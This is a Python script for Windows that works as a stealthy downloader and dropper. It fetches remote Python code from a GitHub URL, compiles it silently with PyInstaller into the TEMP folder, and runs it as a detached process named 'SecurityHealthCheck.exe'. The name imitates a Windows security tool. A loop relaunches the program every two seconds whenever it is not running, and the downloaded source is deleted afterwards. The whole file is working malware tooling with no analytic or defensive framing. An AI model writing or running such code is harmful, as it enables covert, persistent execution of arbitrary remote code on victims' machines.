import os
import sys
import shutil
import subprocess
import urllib.request
import random
import time
import psutil
import win32api
import win32event

def compile_python_to_exe(py_file_path):
    try:
        if py_file_path:
            temp_dir = os.getenv('TEMP')
            dist_folder = os.path.join(temp_dir, "dist")
            build_folder = os.path.join(temp_dir, "build")

            subprocess.call([
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--icon=NONE',
                f'--distpath={dist_folder}',
                f'--workpath={build_folder}',
                py_file_path
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

            exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
            if os.path.exists(exe_file_path):
                exe_dest = os.path.join(temp_dir, os.path.basename(exe_file_path))
                shutil.move(exe_file_path, exe_dest)
                subprocess.Popen(exe_dest, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_CONSOLE, shell=True)
                return exe_dest
            else:
                return None
    except Exception as e:
        return None

def fetch_python_code(url):
    try:
        user_agents = ["Mozilla/5.0 ..."]
        user_agent = random.choice(user_agents)
        headers = {'User-Agent': user_agent}
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response:
            return response.read().decode('utf-8')
    except:
        return None

def write_python_file(code, filename):
    try:
        temp_dir = os.getenv('TEMP')
        py_file_path = os.path.join(temp_dir, filename)
        with open(py_file_path, 'w', encoding='utf-8') as f:
            f.write(code)
        return py_file_path
    except:
        return None

def create_mutex(mutex_name):
    try:
        mutex = win32event.CreateMutex(None, 0, mutex_name)
        if win32api.GetLastError() == 183:
            return False
        return True
    except:
        return False

def download_and_compile_scripts(urls_and_filenames):
    for url, filename in urls_and_filenames:
        code = fetch_python_code(url)
        if code:
            py_file_path = write_python_file(code, filename)
            if py_file_path:
                exe_file = compile_python_to_exe(py_file_path)
                if exe_file:
                    os.remove(py_file_path)

urls_and_filenames = [
    ("https://raw.githubusercontent.com/user/repository/main/SecurityHealthCheck.py", "SecurityHealthCheck.py")
]

while True:
    if not any(p.name() == "SecurityHealthCheck.exe" for p in psutil.process_iter()):
        download_and_compile_scripts(urls_and_filenames)
    time.sleep(2)
